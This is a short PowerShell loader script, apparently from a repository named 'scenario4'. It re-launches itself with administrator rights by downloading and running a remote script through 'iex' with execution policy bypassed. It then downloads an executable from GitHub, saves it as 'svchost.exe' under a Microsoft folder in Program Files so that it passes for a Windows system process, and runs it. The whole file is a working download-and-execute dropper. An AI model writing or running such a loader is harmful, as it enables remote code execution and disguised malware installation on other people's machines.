$scriptUrl = "https://raw.githubusercontent.com/Justanother-engineer/scenario4/main/loader.ps1"
$exeUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/elevcheck.exe"
$dst = "C:\Program Files\Microsoft\svchost.exe"

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoP -NonI -Exec Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`"" -Verb RunAs
    exit
}

New-Item -Path "C:\Program Files\Microsoft" -ItemType Directory -Force | Out-Null
Invoke-WebRequest -Uri $exeUrl -OutFile $dst
Start-Process -FilePath $dst
